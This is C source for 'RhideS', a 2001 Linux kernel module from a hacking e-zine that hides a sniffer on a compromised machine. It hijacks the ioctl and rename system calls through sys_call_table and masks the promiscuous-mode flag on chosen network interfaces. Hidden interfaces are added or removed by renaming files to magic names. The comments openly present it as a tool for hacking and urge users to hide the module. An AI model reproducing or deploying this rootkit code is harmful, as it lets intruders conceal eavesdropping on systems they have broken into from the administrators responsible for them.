/*
 * TILE: RhideS v1.0 <12/05/2001>
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * DECRP: Is usualy to install a sniffer when you hack some system, but if you
 *        do it, the net device is established to promisc mode and if the
 *        admin is inteligent must to discover the sniffer. Using RhideS you
 *        can to hide some promisc mode interface easily. Inserting the
 *        module you can specify magic words.
 *
 *        root@donasec.com ~# insmod rhides.o ins=mete del=saca
 *        root@donasec.com ~#
 *
 *        And you can insert a interface in the list using mv unix comand,
 *        very easy. ?sure?
 *
 * RECOM: ?Will you use it to hack? Please hide the module :)
 *
 * TESTED: This LKM have been tested withou problems on:
 *           - Linux kernel 2.2.18pre21 (Debian 2.2)
 *           - Linux kernel 2.2.18 (Debian 2.2)
 *           - Linux kernel 2.2.19 (Debian 2.2)
 *
 */

#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/mm.h>
#include <linux/if.h>

#include <sys/syscall.h>

#define _7A69SOFT_
#define CODER       "Ripe"
#define DEBUGMODE

#define DEF_INS     "insert_if"
#define DEF_DEL     "remove_if"

#define IFNAMESIZE  32

extern void *sys_call_table[];

char *ins;
char *del;

struct {
  char *ins;
  char *del;
} status;

typedef struct {
  char interface[IFNAMESIZE+1];
  int promisc; 
  struct lif *next;
} lif;

lif *if_list;

int (*o_rename)(const char *oldpath, const char *newpath);
int (*o_ioctl)(int fd, int request, char *argp);

lif *get_interface(char *);

void add_interface(char *interface) {
  lif *ptr=if_list;
#ifdef DEBUGMODE
  printk("(RS) Adding %s interface to hide promisc mode list\n", interface);
#endif
  if (get_interface(interface)) return;
  if (ptr) {
    while (ptr->next) {
      if (!strcmp(ptr->interface, interface)) return;
      ptr=(lif *)ptr->next;
    }
    ptr->next=(struct lif *)kmalloc(sizeof(lif), GFP_KERNEL);
    ptr=(lif *)ptr->next;
    strncpy(ptr->interface, interface, IFNAMESIZE);
    ptr->promisc=0;
    ptr->next=NULL;
  } else {
    if_list=(lif *)kmalloc(sizeof(lif), GFP_KERNEL);
    ptr=if_list;
    strncpy(ptr->interface, interface, IFNAMESIZE);
    ptr->promisc=0;
    ptr->next=NULL;
  }
  return;
}

void del_interface(char *interface) {
  lif *ptr=if_list, *ptr2;
#ifdef DEBUGMODE
  printk("(RS) Deleting %s interface from hide promisc mode list\n", interface);
#endif
  if (!ptr) return;
  if (!strcmp(ptr->interface, interface)) {
    if_list=(lif *)ptr->next;
    kfree(ptr);
    return;
  }
  while(ptr) {
    if (!strcmp(ptr->interface, interface)) break;
    ptr2=ptr;
    ptr=(lif *)ptr->next;
  }
  if (ptr) {
    ptr2->next=ptr->next;
    kfree(ptr);
  }
  return;
}

lif *get_interface(char *interface) {
  lif *ptr=if_list;
  while(ptr) {
    if (!strcmp(ptr->interface, interface)) return((lif *)ptr);
    ptr=(lif *)ptr->next;
  }
  return(0);
}

int my_ioctl(int fd, int request, char *argp) {
  int o_ret;
  struct ifreq ifreq_ret;
  lif *ptr;
  if (request==SIOCSIFFLAGS) {
    __generic_copy_from_user(&ifreq_ret, argp, sizeof(struct ifreq));
    if ((ptr=get_interface(ifreq_ret.ifr_name))==0) return((*o_ioctl)(fd, request, argp));
    if (ifreq_ret.ifr_flags & IFF_PROMISC) ptr->promisc=1;
    else ptr->promisc=0;
    ifreq_ret.ifr_flags=ifreq_ret.ifr_flags|IFF_PROMISC;
    __generic_copy_to_user(argp, &ifreq_ret, sizeof(struct ifreq));
  }
  if (request==SIOCGIFFLAGS) {
    o_ret=(*o_ioctl)(fd, request, argp);
    __generic_copy_from_user(&ifreq_ret, argp, sizeof(struct ifreq));
    if ((ptr=get_interface(ifreq_ret.ifr_name))==0) return(o_ret);
    if ((!ptr->promisc) && (ifreq_ret.ifr_flags&IFF_PROMISC))
      ifreq_ret.ifr_flags=ifreq_ret.ifr_flags^IFF_PROMISC;
    __generic_copy_to_user(argp, &ifreq_ret, sizeof(struct ifreq));
    return(o_ret);
  }
  return((*o_ioctl)(fd, request, argp));
}

int my_rename(const char *oldpath, const char *newpath) {
  if (!strcmp(newpath, status.ins)) {
    add_interface((char *)oldpath);
    return(0);
  }
  if (!strcmp(newpath, status.del)) {
    del_interface((char *)oldpath);
    return(0);
  }
  return((*o_rename)(oldpath, newpath));
}

int init_module() {
  status.ins=(char *)kmalloc(strlen(DEF_INS), GFP_KERNEL);
  status.del=(char *)kmalloc(strlen(DEF_DEL), GFP_KERNEL);
  strcpy(status.ins, DEF_INS);
  strcpy(status.del, DEF_DEL);
if (ins) {
    kfree(status.ins);
    status.ins=ins;
}
if (del) {
    kfree(status.del);
    status.del=del;
}
  o_ioctl=sys_call_table[__NR_ioctl];
  o_rename=sys_call_table[__NR_rename];
  sys_call_table[__NR_ioctl]=my_ioctl;
  sys_call_table[__NR_rename]=my_rename;
#ifdef DEBUGMODE
  printk("(RS) RhideF by Ripe - <ripe@7a69ezine.org>\n");
  printk("(RS) Loaded!\n");
#endif
  return(0);
}

void cleanup_module() {
  sys_call_table[__NR_rename]=o_rename;
  sys_call_table[__NR_ioctl]=o_ioctl;
#ifdef DEBUGMODE
  printk("(RS) RhideF by Ripe - <ripe@7a69ezine.org>\n");
  printk("(RS) UnLoaded!\n");
#endif
}

MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
MODULE_DESCRIPTION("hack: Interface promisc mode hider");
MODULE_PARM(ins, "s");
MODULE_PARM(del, "s");
